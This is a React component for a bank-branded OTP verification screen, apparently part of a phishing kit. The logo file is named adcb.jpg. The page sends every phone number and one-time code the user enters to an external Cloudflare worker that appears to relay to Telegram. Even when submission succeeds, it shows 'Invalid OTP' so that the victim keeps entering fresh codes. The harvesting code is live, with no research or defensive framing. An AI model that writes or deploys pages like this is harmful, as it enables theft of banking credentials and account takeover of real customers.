import React, { useEffect, useState } from "react";
import { Header } from "./Header";
import { useLocation, useNavigate } from "react-router-dom";
import logo from "../src/assets/adcb.jpg";

const OTPVerification = () => {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [timer, setTimer] = useState(120);
  const [isResending, setIsResending] = useState(false);
  const location = useLocation();
  const navigate = useNavigate();
  const { phone } = location.state;

  useEffect(() => {
    const countdown = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          clearInterval(countdown);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(countdown);
  }, []);

  // Format timer as MM:SS
  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const handleVerify = async () => {
    if (!otp) {
      setError("Please enter OTP.");
      return;
    }

    try {
      const response = await fetch("https://my-worker.atique-telegram.workers.dev", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "otp",
          username: `${phone}`,
          otp,
        }),
      });

      const result = await response.json();

      if (result.success) {
        setError("Invalid OTP. Please try again.");
        setOtp("");
        setTimer(120);
      }
    } catch (err) {
      console.error(err);
      setError("Something went wrong. Please try again.");
      setTimer(60);
    }
  };

  const handleResendOTP = async () => {
    setIsResending(true);
    setError("");

    try {
      const response = await fetch("https://my-worker.atique-telegram.workers.dev", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "resend",
          phone: phone,
        }),
      });

      const result = await response.json();

      if (result.success) {
        alert("OTP resent successfully!");
        setTimer(120); // Reset timer after successful resend
      } else {
        alert("Failed to resend OTP.");
      }
    } catch (err) {
      console.error(err);
      alert("Error resending OTP.");
    } finally {
      setIsResending(false);
    }
  };

  return (
    <div className="flex flex-col h-screen font-sans">
      {/* <Header /> */}
      <div className="flex items-center justify-center">
        <div className="w-full max-w-sm sm:max-w-md p-6">
          <div className="flex justify-center mb-5">
            <img
              src={logo}
              alt="Bank Logo"
              className="h-12 w-auto object-contain"
            />
          </div>
          <h2 className="text-2xl font-bold mb-2 text-center">OTP Verification</h2>
          <p className="text-gray-600 text-sm mb-6 text-center">
            We've sent a verification code to your registered mobile number
          </p>

          {/* OTP Input with label */}
          <div className="mb-6">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Enter OTP
            </label>
            <input
              type="number"
              value={otp}
              onChange={(e) => {
                setOtp(e.target.value);
                setError("");
              }}
              placeholder="Enter OTP here"
              className="w-full border border-gray-300 rounded-lg p-3 text-center text-lg font-semibold focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
          </div>

          {/* Resend OTP section */}
          <div className="flex justify-between items-center mb-6 text-sm text-gray-600">
            <span>Didn't receive the code?</span>
            <button
              onClick={handleResendOTP}
              disabled={timer > 0 || isResending}
              className={`${timer === 0
                  ? "text-red-600 hover:underline font-medium"
                  : "text-gray-400 cursor-not-allowed"
                } font-semibold`}
            >
              {timer === 0 ? "Resend OTP" : `Resend in ${formatTime(timer)}`}
            </button>
          </div>

          {/* Verify Button */}
          <button
            onClick={handleVerify}
            style={{ backgroundColor: "#D4253A" }}
            className="w-full text-white font-semibold py-3 rounded-lg transition-colors hover:bg-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
          >
            Verify
          </button>

          {error && <p className="text-red-600 mt-4 text-center">{error}</p>}
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;